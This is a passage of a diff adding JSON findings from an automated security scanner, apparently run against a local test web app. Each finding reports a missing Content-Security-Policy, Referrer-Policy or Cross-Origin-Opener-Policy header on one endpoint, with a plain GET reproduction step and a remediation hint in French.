+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Deliverys"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-96d9d98a"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Deliverys",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-f316e68f",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Deliverys"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-96d9d98a"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Deliverys",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-08085956",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/memories"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1496b74b"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/memories",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-a354ca9f",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/memories"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1496b74b"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/memories",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-bf1cc171",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/rest/memories"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1496b74b"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/rest/memories",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-7a413675",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Hints"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-3749e8b2"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Hints",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-e090e63f",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Hints"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-3749e8b2"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Hints",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-1c5d552c",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/api/Hints"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-3749e8b2"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/api/Hints",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-9f5e12c1",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-bf868ac1"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-49851ba2",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-bf868ac1"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-75b7974d",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-bf868ac1"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-0f76043b",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/acquisitions.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-00f34679"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/acquisitions.md",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-de18293c",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/acquisitions.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-00f34679"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/acquisitions.md",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-a51bf681",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/acquisitions.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-00f34679"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/acquisitions.md",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-471ceb47",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/announcement_encrypted.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-3b1a5881"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/announcement_encrypted.md",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-d3495ffb",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/announcement_encrypted.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-3b1a5881"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/announcement_encrypted.md",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-e8b53212",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/announcement_encrypted.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-3b1a5881"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/announcement_encrypted.md",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-89b16339",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/incident-support.kdbx"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-790f8d9b"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/incident-support.kdbx",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-0e0abe7e",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/incident-support.kdbx"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-790f8d9b"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/incident-support.kdbx",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-586391db",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/incident-support.kdbx"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-790f8d9b"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/incident-support.kdbx",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-6720c1e6",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/legal.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1702bfbd"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/legal.md",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-307b7de1",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/legal.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1702bfbd"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/legal.md",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-2ce36b7e",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/legal.md"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-1702bfbd"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/legal.md",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-1d6684c6",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-77508af0"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-f9a51e1b",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-77508af0"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url",
+        "2. Observer la réponse : Referrer-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:RP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header RP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-aa29e1cf",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-346",
+    "severity": "LOW",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-77508af0"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_linux_amd_64.url",
+        "2. Observer la réponse : Cross-Origin-Opener-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:COOP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header COOP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-d3bd400c",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-693",
+    "severity": "MEDIUM",
+    "affected_endpoints": [
+      "http://localhost:3000/ftp/quarantine/juicy_malware_linux_arm_64.url"
+    ],
+    "proof": {
+      "observations": [
+        "OBS-fded2e3f"
+      ],
+      "experiments": [],
+      "diffs": [],
+      "reproduction_steps": [
+        "1. Envoyer GET http://localhost:3000/ftp/quarantine/juicy_malware_linux_arm_64.url",
+        "2. Observer la réponse : Content-Security-Policy absent"
+      ],
+      "passive_tags": [
+        "missing:CSP"
+      ]
+    },
+    "remediation_hint": "Ajouter le header CSP dans toutes les réponses HTTP.",
+    "confirmed_threshold_used": 0.85
+  },
+  {
+    "id": "FIND-2f45513e",
+    "hypothesis_id": "passive-observation",
+    "property_id": "",
+    "status": "CONFIRMED",
+    "confidence": 0.96,
+    "confidence_breakdown": {
+      "oracle_strength": 1.0,
+      "reproducibility": 0.65,
+      "observation_quality": 0.8,
+      "behavioral_specificity": 1.0,
+      "experiment_coverage": 0.5,
+      "overall": 0.77,
+      "v2_boost": 0.0,
+      "ml_boost": 0.0
+    },
+    "explanation": null,
+    "owasp_category": "A05:2021",
+    "cwe_id": "CWE-116",
+    "severity": "INFO",
+    "affected_endpoints": [
